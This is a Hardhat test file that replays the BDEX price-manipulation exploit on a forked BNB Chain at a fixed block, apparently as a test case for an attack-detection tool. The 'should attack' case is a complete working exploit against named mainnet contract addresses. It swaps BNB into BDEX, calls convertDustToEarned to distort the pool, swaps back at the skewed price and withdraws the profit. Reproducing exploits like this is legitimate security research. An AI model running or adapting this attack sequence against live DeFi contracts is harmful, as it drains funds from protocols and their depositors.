import { ethers } from 'hardhat'
import { BvaultsStrategy, IERC20, BPair, CIERC20 } from '../typechain-types'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'

describe('CCA Detects BDEX Attack Test', async function () {
    let attacker: SignerWithAddress
    let BNB: CIERC20
    let BDEX: IERC20
    let vaultsStrategy: BvaultsStrategy
    let PAIR: BPair
    let usdc: IERC20

    beforeEach(async () => {
        ;[attacker] = await ethers.getSigners()
        BNB = await ethers.getContractAt('CIERC20', '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c')
        BDEX = await ethers.getContractAt('IERC20', '0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867')
        vaultsStrategy = await ethers.getContractAt('BvaultsStrategy', '0xB2B1DC3204ee8899d6575F419e72B53E370F6B20')
        PAIR = await ethers.getContractAt('BPair', '0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D')
    })

    it('should block number equal to 22629431', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(22629431)
    })

    it('should attack', async function () {
        const beforeBalance = await ethers.provider.getBalance(attacker.address)
        console.log('Attacker BNB balance after exploit:', ethers.formatEther(beforeBalance))
        // Step 1: Send BNB to the attacker's address
        // Note: Hardhat's default accounts are funded with test Ether, but on BSC, you would need BNB
        const amountBNB = ethers.parseEther('34') // Equivalent to 34 BNB
        await attacker.sendTransaction({
            to: await BNB.getAddress(),
            value: amountBNB,
        })
        // Step 2: Swap BNB for BDEX
        const amountIn = await BNB.balanceOf(attacker.address)
        await BNB.connect(attacker).transfer(await PAIR.getAddress(), amountIn)
        const [BDEXReserve, WBNBReserve] = await PAIR.getReserves()
        const amountOut = (998n * amountIn * BDEXReserve) / (1000n * WBNBReserve + 998n * amountIn)
        //console.log('amountOut', amountOut)
        await PAIR.connect(attacker).swap(amountOut, 0, attacker.address, '0x')

        // Step 3: Convert dust to earned
        await vaultsStrategy.connect(attacker).convertDustToEarned()

        // Step 4: Transfer BDEX to the pair and swap back to BNB
        const amountBDEX = await BDEX.balanceOf(attacker.address)
        await BDEX.connect(attacker).transfer(await PAIR.getAddress(), amountBDEX)
        const [BDEXReserveAfter, WBNBReserveAfter] = await PAIR.getReserves()
        const amountWBNB = (998n * amountBDEX * WBNBReserveAfter) / (1000n * BDEXReserveAfter + 998n * amountBDEX)
        await PAIR.connect(attacker).swap(0, amountWBNB, attacker.address, '0x')

        // Step 5: Withdraw BNB
        // Note: This step requires WBNB contract to have a 'withdraw' function which converts WBNB to BNB
        await BNB.connect(attacker).withdraw(amountWBNB)

        // Check final balance
        const finalBalance = await ethers.provider.getBalance(attacker.address)
        console.log('Attacker BNB balance after exploit:', ethers.formatEther(finalBalance))
    })
})
